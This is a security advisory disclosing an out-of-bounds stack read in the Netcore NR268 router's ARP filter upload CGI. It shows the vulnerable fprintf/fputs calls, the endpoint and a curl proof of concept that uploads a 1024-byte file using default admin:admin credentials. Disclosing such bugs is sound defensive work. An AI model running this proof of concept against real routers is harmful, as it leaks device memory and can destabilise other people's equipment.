# Netcore NR268 Stack Buffer Over-read in the ARP Filter Upload Import Handler

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Out-of-Bounds Read (CWE-126)  
**Credits:** Zhou Ao, Yin Luxing, Jiang Yuxuan, Liu Xin, @Nebusec

## Summary

`filter_arp_put_file_cgi` reads raw upload chunks into a stack buffer and then passes them to `fprintf(stderr, "%s")` and `fputs()`. A NUL-free 1024-byte chunk makes both string APIs walk past the received data into adjacent stack memory, leaking bytes into logs and the imported `/tmp/filter_arp_file` contents.

## Technical Details

The handler allocates `char v24[1072]`, clears only the first 1024 bytes, parses uploaded-file metadata from `get_form_value(..., "put_file")`, seeks `stdin` to the recorded offset, and reads up to 1024-byte chunks into `v24`. After each non-zero read it immediately calls:

```
fprintf(stderr, "buf=%s\n", v24);
fputs(v24, imported_file);
```

A full 1024-byte chunk with no NUL has no terminator at `v24[1024]`. Both string APIs therefore continue into the uncleared tail of the stack buffer and adjacent stack memory. Those leaked bytes are copied into stderr logs and `/tmp/filter_arp_file` before the import IPC call runs.

The shipped ARP upload pages use `arp_bind_text` as the multipart part name. The vulnerable handler path is reached when the part is named `put_file`.

### Affected Endpoint

- URL: `/router/filter_arp_put_file.cgi`
- Parameters: multipart field `put_file`
- Method: POST
- Authentication: HTTP Basic authentication

## Proof of Concept

```bash
head -c 1024 /dev/zero | tr '\0' 'A' > arp.txt

curl -sv -u admin:admin \
  -F "put_file=@arp.txt;filename=arp.txt;type=application/octet-stream" \
  "http://192.168.1.1/router/filter_arp_put_file.cgi"
```

### Outcome

`fprintf(stderr, "buf=%s\n", v24)` and `fputs(v24, ...)` read past the 1024 received bytes. Adjacent stack data is copied into stderr logs and `/tmp/filter_arp_file`. The HTTP response may still be generic success or error output; the disclosure is in the imported file and logs.

## Impact

- **Confidentiality:** Medium – adjacent stack memory is leaked into logs and the imported ARP file.
- **Integrity:** Low
- **Availability:** High – unbounded string walks on the stack can destabilize the CGI worker.

An authenticated attacker who controls the multipart part name can force an over-read of CGI stack memory.
